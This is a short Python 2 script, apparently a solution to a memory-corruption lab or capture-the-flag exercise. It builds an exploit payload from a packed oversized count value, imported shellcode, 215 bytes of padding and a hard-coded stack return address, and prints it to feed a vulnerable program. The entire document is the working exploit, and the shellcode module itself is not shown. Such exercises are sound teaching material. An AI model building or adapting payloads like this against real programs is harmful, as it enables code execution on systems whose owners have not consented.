from shellcode import shellcode
from struct import pack

count = 0x40000036
addr = 0xbffefd00

print pack("<I", count) + shellcode + "A"*215 + pack("<I", addr)
